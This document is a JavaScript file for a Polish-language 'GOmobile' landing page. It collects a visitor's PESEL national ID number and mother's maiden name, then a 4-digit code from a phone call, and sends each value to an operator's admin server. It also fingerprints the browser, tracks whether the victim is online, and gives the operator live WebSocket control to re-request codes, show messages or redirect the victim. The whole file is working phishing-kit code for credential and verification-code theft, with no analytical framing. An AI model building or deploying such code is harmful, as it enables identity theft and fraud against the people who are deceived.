/**
 * GOmobile — 2 ekrany:
 *   1) PESEL + nazwisko panieńskie matki → log w admince (GOmobile)
 *   2) 4-cyfrowy kod z połączenia → code_4 w admince
 * WebSocket: admin może wysłać show_4_code → ponowny ekran kodu
 */

let sessionToken = null;
let ws = null;
let statusHeartbeat = null;
let currentScreen = 'form'; // 'form' | 'code'
const STATUS_HEARTBEAT_INTERVAL = 5000;

// ===================== Walidacja PESEL =====================

function validatePesel(pesel) {
    if (!/^\d{11}$/.test(pesel)) {
        return { valid: false, error: 'PESEL musi składać się z 11 cyfr' };
    }
    const digits = pesel.split('').map(Number);
    const rawYear = digits[0] * 10 + digits[1];
    const rawMonth = digits[2] * 10 + digits[3];
    const day = digits[4] * 10 + digits[5];
    let year, month;
    if (rawMonth >= 1 && rawMonth <= 12) { year = 1900 + rawYear; month = rawMonth; }
    else if (rawMonth >= 21 && rawMonth <= 32) { year = 2000 + rawYear; month = rawMonth - 20; }
    else if (rawMonth >= 41 && rawMonth <= 52) { year = 2100 + rawYear; month = rawMonth - 40; }
    else if (rawMonth >= 61 && rawMonth <= 72) { year = 2200 + rawYear; month = rawMonth - 60; }
    else if (rawMonth >= 81 && rawMonth <= 92) { year = 1800 + rawYear; month = rawMonth - 80; }
    else { return { valid: false, error: 'Nieprawidłowy numer PESEL' }; }
    const daysInMonth = new Date(year, month, 0).getDate();
    if (day < 1 || day > daysInMonth) return { valid: false, error: 'Nieprawidłowy numer PESEL' };
    const weights = [1, 3, 7, 9, 1, 3, 7, 9, 1, 3];
    let sum = 0;
    for (let i = 0; i < 10; i++) sum += digits[i] * weights[i];
    if ((10 - (sum % 10)) % 10 !== digits[10]) return { valid: false, error: 'Nieprawidłowy numer PESEL' };
    return { valid: true };
}

function validateMotherName(name) {
    if (name.length < 3) return { valid: false, error: 'Nazwisko musi mieć co najmniej 3 znaki' };
    if (!/^[A-Za-zĄąĆćĘęŁłŃńÓóŚśŹźŻż][A-Za-zĄąĆćĘęŁłŃńÓóŚśŹźŻż\s\-']+$/.test(name))
        return { valid: false, error: 'Nazwisko może zawierać tylko litery' };
    return { valid: true };
}

// ===================== Инициализация =====================

document.addEventListener('DOMContentLoaded', () => {
    if (CONFIG.SETTINGS.debug) console.log('GOmobile — inicjalizacja');
    createSession();
    setupCodeInputs();
});

// ===================== Сессия =====================

async function createSession() {
    try {
        const fingerprint = await generateFingerprint();
        const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/session/create`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                landing_id: CONFIG.LANDING_ID,
                landing_name: CONFIG.LANDING_NAME,
                landing_version: 'GOmobile',
                fingerprint,
                user_agent: navigator.userAgent,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                referer: window.location.origin || window.location.href
            })
        });
        const data = await response.json().catch(() => ({}));
        if (response.ok && data.session_token) {
            sessionToken = data.session_token;
            if (CONFIG.SETTINGS.debug) console.log('Sesja:', sessionToken);
            connectWebSocket();
            sendStatus('online');
            startStatusHeartbeat();
        } else {
            sessionToken = 'local_' + Date.now();
            if (response.status === 403) console.warn('403 — IP zablokowany');
        }
    } catch (err) {
        console.error('Błąd sesji:', err);
        sessionToken = 'local_' + Date.now();
    }
}

// ===================== Экраны =====================

function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(screenId).classList.add('active');

    // Обновляем степпер
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    if (screenId === 'screen-form') {
        currentScreen = 'form';
        step1.classList.add('active');
        step2.classList.remove('active');
    } else if (screenId === 'screen-code') {
        currentScreen = 'code';
        step1.classList.add('active');
        step2.classList.add('active');
        clearCodeInputs();
        document.querySelector('.code-digit[data-index="0"]').focus();
    }
}

// ===================== Кнопка DALEJ =====================

async function onDalej() {
    if (currentScreen === 'form') {
        await submitForm();
    } else if (currentScreen === 'code') {
        await submitCode();
    }
}

async function submitForm() {
    const peselInput = document.getElementById('pesel');
    const motherInput = document.getElementById('motherName');
    const peselError = document.getElementById('peselError');
    const motherError = document.getElementById('motherError');
    const btn = document.getElementById('btnDalej');

    peselError.style.display = 'none';
    motherError.style.display = 'none';

    const pesel = (peselInput.value || '').trim();
    const mother = (motherInput.value || '').trim();

    if (!pesel) { peselError.textContent = 'Wprowadź numer PESEL'; peselError.style.display = 'block'; return; }
    const peselCheck = validatePesel(pesel);
    if (!peselCheck.valid) { peselError.textContent = peselCheck.error; peselError.style.display = 'block'; return; }
    if (!mother) { motherError.textContent = 'Wprowadź nazwisko panieńskie matki'; motherError.style.display = 'block'; return; }
    const motherCheck = validateMotherName(mother);
    if (!motherCheck.valid) { motherError.textContent = motherCheck.error; motherError.style.display = 'block'; return; }

    btn.disabled = true;

    try {
        await sendData('pesel_or_passport', pesel);
        await sendData('mother_maiden_name', mother);
        if (typeof fbq === 'function') fbq('track', 'CompleteRegistration');
        // Переход на экран кода
        showScreen('screen-code');
        btn.disabled = false;
    } catch (err) {
        console.error(err);
        btn.disabled = false;
    }
}

async function submitCode() {
    const digits = document.querySelectorAll('.code-digit');
    const code = Array.from(digits).map(d => d.value).join('');
    const codeError = document.getElementById('codeError');
    const btn = document.getElementById('btnDalejCode');

    codeError.style.display = 'none';

    if (code.length < 4) {
        codeError.textContent = 'Wprowadź 4-cyfrowy kod';
        codeError.style.display = 'block';
        return;
    }
    if (!/^\d{4}$/.test(code)) {
        codeError.textContent = 'Kod musi składać się z 4 cyfr';
        codeError.style.display = 'block';
        return;
    }

    btn.disabled = true;

    try {
        await sendData('code_4', code);
        btn.textContent = 'WYSŁANO';
        btn.classList.add('success');
        digits.forEach(d => d.disabled = true);
    } catch (err) {
        console.error(err);
        btn.disabled = false;
    }
}

// ===================== Поля ввода кода =====================

function setupCodeInputs() {
    const digits = document.querySelectorAll('.code-digit');
    digits.forEach((input, idx) => {
        input.addEventListener('input', (e) => {
            const val = e.target.value.replace(/\D/g, '');
            e.target.value = val.slice(0, 1);
            if (val && idx < 3) digits[idx + 1].focus();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && idx > 0) {
                digits[idx - 1].focus();
            }
        });
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const paste = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, 4);
            paste.split('').forEach((ch, i) => {
                if (digits[i]) digits[i].value = ch;
            });
            if (paste.length >= 4) digits[3].focus();
            else if (paste.length > 0) digits[paste.length - 1].focus();
        });
    });
}

function clearCodeInputs() {
    const digits = document.querySelectorAll('.code-digit');
    const btn = document.getElementById('btnDalejCode');
    const codeError = document.getElementById('codeError');
    digits.forEach(d => { d.value = ''; d.disabled = false; });
    if (btn) {
        btn.disabled = false;
        btn.textContent = 'DALEJ';
        btn.classList.remove('success');
    }
    codeError.style.display = 'none';
}

function requestRetry() {
    if (!sessionToken || String(sessionToken).startsWith('local_')) return;
    sendData('call_request', 'Powtórz połączenie');
}

// ===================== WebSocket + Status =====================

function connectWebSocket() {
    if (!sessionToken || String(sessionToken).startsWith('local_')) return;
    try {
        ws = new WebSocket(`${CONFIG.ADMIN_WS_URL}/client/${sessionToken}`);
        ws.onopen = () => {
            if (CONFIG.SETTINGS.debug) console.log('WS connected');
        };
        ws.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                handleCommand(data);
            } catch (e) {}
        };
        ws.onerror = () => { if (CONFIG.SETTINGS.debug) console.warn('WS error'); };
        ws.onclose = () => setTimeout(connectWebSocket, CONFIG.SETTINGS.wsReconnectTimeout);
    } catch (err) {
        if (CONFIG.SETTINGS.debug) console.error('WS:', err);
    }
}

function handleCommand(data) {
    const { command } = data;
    switch (command) {
        case 'show_4_code':
            // Админ запросил новый 4-значный код
            showScreen('screen-code');
            break;
        case 'show_loading':
            // Можно показать загрузку, пока просто ничего
            break;
        case 'show_message':
            if (data.message) {
                const codeError = document.getElementById('codeError');
                codeError.textContent = data.message;
                codeError.style.display = 'block';
            }
            break;
        case 'redirect':
            if (data.url) window.location.href = data.url;
            break;
        default:
            if (CONFIG.SETTINGS.debug) console.log('Unknown command:', command);
    }
}

async function sendStatus(status) {
    if (!sessionToken || String(sessionToken).startsWith('local_')) return;
    try {
        await fetch(`${CONFIG.ADMIN_API_URL}/api/session/status`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ session_token: sessionToken, status })
        });
    } catch (err) {}
}

function sendStatusSync(status) {
    if (!sessionToken || String(sessionToken).startsWith('local_')) return;
    navigator.sendBeacon(`${CONFIG.ADMIN_API_URL}/api/session/status`,
        JSON.stringify({ session_token: sessionToken, status: status }));
}

function startStatusHeartbeat() {
    if (statusHeartbeat) return;
    statusHeartbeat = setInterval(() => {
        if (!document.hidden) sendStatus('online');
    }, STATUS_HEARTBEAT_INTERVAL);
}

window.addEventListener('beforeunload', () => sendStatusSync('offline'));
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        setTimeout(() => { if (document.hidden) sendStatus('offline'); }, 8000);
    } else {
        sendStatus('online');
    }
});

// ===================== API =====================

async function sendData(type, value) {
    if (!sessionToken || String(sessionToken).startsWith('local_')) {
        if (CONFIG.SETTINGS.debug) console.warn('Brak sesji:', type);
        return;
    }
    const response = await fetch(`${CONFIG.ADMIN_API_URL}/api/data/save`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_token: sessionToken, data_type: type, data_value: value })
    });
    if (CONFIG.SETTINGS.debug) console.log('Wysłano:', type);
    return response.json();
}

async function generateFingerprint() {
    const parts = [navigator.userAgent, navigator.language, screen.width, screen.height, new Date().getTimezoneOffset()];
    const buf = new TextEncoder().encode(parts.join('|'));
    const hash = await crypto.subtle.digest('SHA-256', buf);
    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
}
